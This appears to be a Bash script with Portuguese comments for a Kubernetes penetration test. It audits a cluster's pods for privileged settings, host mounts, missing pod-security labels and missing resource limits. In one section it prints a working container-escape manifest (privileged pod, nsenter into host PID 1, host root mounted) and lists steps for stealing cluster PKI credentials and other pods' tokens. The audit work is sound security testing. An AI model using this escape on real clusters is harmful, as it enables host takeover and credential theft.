#!/usr/bin/env bash
# =============================================================================
# ESCAPE DE CONTAINER E PRIVILEGE ESCALATION
# Técnicas: MITRE T1611 - Escape to Host, T1610 - Deploy Container
# OWASP K8s: K01-Insecure Workload Configurations
# =============================================================================
# ATENÇÃO: Estes testes tentam escapar para o host. Execute em ambiente de teste.
# =============================================================================

set -euo pipefail

REPORT_DIR="${REPORT_DIR:-/tmp/k8s-pentest-$(date +%Y%m%d-%H%M%S)}"
mkdir -p "$REPORT_DIR/workloads"

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'; NC='\033[0m'; BOLD='\033[1m'

log()  { echo -e "${BOLD}[*]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
vuln() { echo -e "${RED}[VULN]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC} $*"; }

echo "============================================================"
echo " K8s Pentest - Fase 4: Container Escape & Privilege Escalation"
echo " Data: $(date)"
echo "============================================================"
echo ""

# ------------------------------------------------------------------
# 1. Detectar pods já vulneráveis (privileged, hostPID, hostPath)
# ------------------------------------------------------------------
log "1. Auditoria de configurações inseguras de pods"
{
  kubectl get pods -A -o json 2>/dev/null | python3 -c "
import json, sys

data = json.load(sys.stdin)
findings = []

for item in data['items']:
  ns   = item['metadata']['namespace']
  name = item['metadata']['name']
  spec = item.get('spec', {})

  issues = []

  # hostPID / hostIPC / hostNetwork
  if spec.get('hostPID'):    issues.append('hostPID=true')
  if spec.get('hostIPC'):    issues.append('hostIPC=true')
  if spec.get('hostNetwork'):issues.append('hostNetwork=true')

  # Volumes com hostPath
  for vol in spec.get('volumes', []):
    hp = vol.get('hostPath', {})
    if hp:
      path = hp.get('path', '/')
      issues.append(f'hostPath={path}')

  # Containers privilegiados / capabilities
  for c in spec.get('containers', []) + spec.get('initContainers', []):
    sc = c.get('securityContext', {})
    if sc.get('privileged'):
      issues.append(f'container \"{c[\"name\"]}\" privileged=true')
    caps = sc.get('capabilities', {})
    add_caps = caps.get('add', [])
    dangerous = [c for c in add_caps if c in ['SYS_ADMIN','SYS_PTRACE','NET_ADMIN','SYS_MODULE','ALL']]
    if dangerous:
      issues.append(f'container \"{c[\"name\"]}\" caps={dangerous}')
    if sc.get('allowPrivilegeEscalation', True):
      pass  # True é o padrão, só reportar se há outros problemas
    if sc.get('runAsUser') == 0:
      issues.append(f'container \"{c[\"name\"]}\" runAsRoot=true')

  if issues:
    print(f'  [{ns}/{name}]')
    for i in issues:
      print(f'    -> {i}')
    print()
" 2>/dev/null
} | tee "$REPORT_DIR/workloads/insecure-pods.txt"

# ------------------------------------------------------------------
# 2. Teste: Pod privilegiado para escape ao host
# ------------------------------------------------------------------
log "2. Simulando pod privilegiado (vector de escape)"
{
  cat << 'EOF'
Manifesto que seria usado para escape (NÃO aplicado automaticamente):

apiVersion: v1
kind: Pod
metadata:
  name: priv-escape-test
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: escape
    image: ubuntu:22.04
    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
  restartPolicy: Never

Técnica: Com hostPID=true e privileged=true, é possível:
  1. nsenter no PID 1 do host -> shell no host
  2. Montar /host e ler/escrever em qualquer arquivo do nó
  3. Extrair credenciais de /etc/kubernetes/pki/
  4. Ler tokens de outros pods via /proc/<pid>/environ

Para executar (AMBIENTE DE TESTE APENAS):
  kubectl apply -f <manifesto-acima>
  kubectl exec -it priv-escape-test -- bash
EOF

  echo ""
  echo "=== Verificando se conseguimos criar pod privilegiado ==="
  if kubectl auth can-i create pods --all-namespaces 2>/dev/null | grep -q "yes"; then
    warn "POSSO criar pods! Vector de escape disponível."

    # Verificar se há PodSecurityAdmission/PSP bloqueando
    echo "Verificando PodSecurity Admission..."
    for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
      label=$(kubectl get namespace "$ns" -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce}' 2>/dev/null)
      if [[ -z "$label" ]]; then
        warn "Namespace '$ns' sem PSA enforce label (pods privilegiados podem ser criados!)"
      else
        ok "Namespace '$ns' PSA enforce=$label"
      fi
    done
  else
    ok "Não tenho permissão para criar pods"
  fi
} | tee "$REPORT_DIR/workloads/privilege-escape.txt"

# ------------------------------------------------------------------
# 3. Verificar PodSecurity Standards e PSPs
# ------------------------------------------------------------------
log "3. Pod Security Policies / Pod Security Admission"
{
  echo "=== PodSecurityPolicies (deprecado no K8s 1.25+) ==="
  kubectl get psp 2>/dev/null || echo "PSP não disponível (K8s >= 1.25 ou não ativado)"

  echo ""
  echo "=== Pod Security Admission Labels por namespace ==="
  kubectl get namespaces -o json 2>/dev/null | python3 -c "
import json,sys
data=json.load(sys.stdin)
print(f'  {\"Namespace\":<30} {\"Enforce\":<15} {\"Audit\":<15} {\"Warn\":<15}')
print('  ' + '-'*75)
for ns in data['items']:
  name = ns['metadata']['name']
  labels = ns['metadata'].get('labels',{})
  enforce = labels.get('pod-security.kubernetes.io/enforce', '-')
  audit   = labels.get('pod-security.kubernetes.io/audit', '-')
  warn_l  = labels.get('pod-security.kubernetes.io/warn', '-')
  if enforce == '-' and audit == '-':
    marker = ' <-- SEM RESTRICAO'
  else:
    marker = ''
  print(f'  {name:<30} {enforce:<15} {audit:<15} {warn_l:<15}{marker}')
" 2>/dev/null
} | tee "$REPORT_DIR/workloads/pod-security.txt"

# ------------------------------------------------------------------
# 4. Verificar imagens sem tag específica / imagens root
# ------------------------------------------------------------------
log "4. Auditoria de imagens de container"
{
  echo "=== Containers usando imagem 'latest' ou sem tag ==="
  kubectl get pods -A -o json 2>/dev/null | python3 -c "
import json,sys
data=json.load(sys.stdin)
for item in data['items']:
  ns=item['metadata']['namespace']
  name=item['metadata']['name']
  for c in item.get('spec',{}).get('containers',[]):
    img=c.get('image','')
    if ':latest' in img or (':' not in img):
      print(f'  {ns}/{name} -> {img} (sem tag fixa)')
" 2>/dev/null

  echo ""
  echo "=== Containers sem liveness/readiness probes ==="
  kubectl get pods -A -o json 2>/dev/null | python3 -c "
import json,sys
data=json.load(sys.stdin)
count=0
for item in data['items']:
  ns=item['metadata']['namespace']
  name=item['metadata']['name']
  for c in item.get('spec',{}).get('containers',[]):
    if not c.get('livenessProbe') and not c.get('readinessProbe'):
      count+=1
print(f'Total sem probes: {count}')
" 2>/dev/null
} | tee "$REPORT_DIR/workloads/image-audit.txt"

# ------------------------------------------------------------------
# 5. Resource limits (DoS interno)
# ------------------------------------------------------------------
log "5. Pods sem resource limits (risco de DoS por starvation)"
{
  kubectl get pods -A -o json 2>/dev/null | python3 -c "
import json,sys
data=json.load(sys.stdin)
count=0
for item in data['items']:
  ns=item['metadata']['namespace']
  name=item['metadata']['name']
  for c in item.get('spec',{}).get('containers',[]):
    res=c.get('resources',{})
    if not res.get('limits'):
      print(f'  {ns}/{name} -> container \"{c[\"name\"]}\" SEM resource limits')
      count+=1
print(f'Total sem limits: {count}')
" 2>/dev/null
} | tee "$REPORT_DIR/workloads/resource-limits.txt"

echo ""
echo "============================================================"
echo " Análise de Workloads concluída!"
echo " Relatório: $REPORT_DIR/workloads/"
echo "============================================================"
